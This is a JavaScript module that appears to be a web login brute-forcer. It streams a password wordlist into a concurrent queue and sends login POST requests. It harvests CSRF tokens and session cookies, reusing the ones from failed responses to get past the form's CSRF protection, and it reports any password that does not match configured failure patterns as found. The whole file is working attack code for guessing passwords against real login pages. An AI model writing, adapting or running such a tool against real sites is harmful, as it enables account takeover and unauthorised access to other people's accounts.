var fs      = require('fs');
var es      = require('event-stream');
var async   = require('async');
var request = require('request');
var logger  = require('./logger.js');

// ================================================================================================
// Public API
// ================================================================================================

function launch(config, onSuccess, onFail) {
  var queue = async.queue(tryLogin, config.concurrency);

  queue.drain = function() {
    logger.info('Finished');
  };

  logger.info('Reading wordlist...');

  fs.createReadStream(config.wordlist)
    .on('error', function() {
      logger.error('Error reading file');
    })
    .on('end', function() {
      logger.info('Full wordlist read');
    })
    .pipe(es.split())
    .pipe(es.map(function(word) {
        queue.push(word);
      })
    );

  // ==============================================================================================
  // Private 
  // ==============================================================================================

  // Array of token data
  var tokenPool = [];

  // Get a CSRF token from the pool if available, otherwise request one
  function getCSRF(callback) {
    var sample = tokenPool.pop();

    if (sample) {
      callback(sample.token, sample.cookie);
    } else {
      requestCSRF(callback);
    }
  }

  // Request CSRF token from server
  function requestCSRF(callback) {
    var reqConfig = config.getAdvanced();

    request(reqConfig.csrf, function (error, response, body) {

      if (!error && response.statusCode === 200) {
        
        collectCSRF(response, body, reqConfig.capture.csrfRegex, callback);

      } else {
        
        logger.warn('Server responded with: ' + response.statusCode);
        onFail();

      }
    });
  }

  // Collect CSRF token from response body and save to token pool
  function collectCSRF(response, body, csrfRegex, callback) {

    var cookieString = response.headers['set-cookie'] || '';
    var capture      = body.match(new RegExp(csrfRegex));

    if (!capture) {

      logger.error('CSRF token not found');
      logger.info('Debug info:\n');
      logger.info(body);
      onFail();
      
    }

    callback(capture[1], cookieString);
  }

  // Process server response to a login attempt
  function processLoginResponse(response, body, password) {
    
    // If we match known regex (can be multiple) password is incorrect
    var captureConfig = config.getAdvanced().capture;
    var loginFailures = captureConfig.loginRegex;
    var csrfRegex     = captureConfig.csrfRegex;

    if (response.statusCode === 200 && matchAny(loginFailures, body)) { 

      logger.info('Invalid: ' + password);
      
      collectCSRF(response, body, csrfRegex, function(token, cookieString) {
        tokenPool.push({ 
          token: token, 
          cookie: cookieString 
        });
      });

    } else if (response.statusCode < 400) {

      logger.info('FOUND: ' + password);
      logger.info('Shutting down....');
      onSuccess(password);

    } else {
      
      logger.warn('Server responded with: ' + response.statusCode);
      onFail();

    }
  }

  // Attempt to login with given password
  function tryLogin(password, callback) {

    getCSRF(function(token, cookieString) {
      var opt = config.getLogin(password, token, cookieString);

      // Send a login POST
      request(opt, function (error, response, body) {
        
        if (!error) { 
          processLoginResponse(response, body, password);
        } else {
          logger.error(error.toString());
        }
        
        callback();
      });
    });
  }
}

exports.launch = launch;

// ================================================================================================
// Helpers
// ================================================================================================

function matchAny(arrPatterns, sTarget) {
  for (var i = 0; i < arrPatterns.length; i++) {
    
    var re    = new RegExp(arrPatterns[i]);
    var match = sTarget.match(re);

    if (match) {
      return match;
    }
  }

  return null;

}